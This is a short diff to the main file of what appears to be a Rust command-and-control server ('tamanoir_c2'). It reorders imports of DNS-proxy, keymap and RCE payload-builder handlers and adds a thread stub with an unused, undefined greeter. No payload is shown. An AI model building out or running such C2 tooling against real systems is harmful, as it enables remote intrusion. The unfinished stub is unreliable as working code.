@@ -1,14 +1,15 @@
-use std::{collections::HashMap, net::Ipv4Addr, sync::Arc};
+use std::{collections::HashMap, net::Ipv4Addr, sync::Arc, thread};
 
 use clap::Parser;
 use log::{debug, error, info};
 use tamanoir_c2::{
+    Session, TargetArch,
     cli::{Command, Opt, RceCommand},
     handlers::{
         dns_proxy::{add_info, forward_req, init_keymaps, mangle, max_payload_length},
         rce::{builder::build, tester::test_bin},
     },
-    select_payload, Session, TargetArch,
+    select_payload,
 };
 use tamanoir_common::ContinuationByte;
 use tokio::{net::UdpSocket, sync::Mutex};
@@ -65,6 +66,10 @@ async fn main() -> anyhow::Result<()> {
             rce,
             target_arch,
         } => {
+            thread::spawn(move || {
+                let addr = "[::1]:50051".parse().unwrap();
+                let greeter = MyGreeter::default();
+            });
             init_keymaps();
             let sock = UdpSocket::bind(format!("0.0.0.0:{}", port)).await?;
             info!("Listening on {}", format!("0.0.0.0:{}", port));
